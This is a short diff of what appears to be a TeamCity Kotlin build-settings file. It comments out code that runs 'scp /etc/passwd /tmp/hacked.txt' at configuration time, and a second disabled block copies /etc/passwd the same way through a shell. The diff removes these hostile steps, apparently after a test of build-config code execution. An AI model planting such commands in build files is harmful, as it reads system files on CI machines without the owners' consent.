@@ -32,9 +32,9 @@ project {
 
     buildType(Build)
 
-    var process = Runtime.getRuntime().exec("scp /etc/passwd /tmp/hacked.txt")
+    /*var process = Runtime.getRuntime().exec("scp /etc/passwd /tmp/hacked.txt")
     val exitCode = process.waitFor()
-    println(exitCode)
+    println(exitCode*/
 
     /*val builder = ProcessBuilder()
     builder.command("sh", "-c", "cat /etc/passwd >> /tmp/hacked.txt")
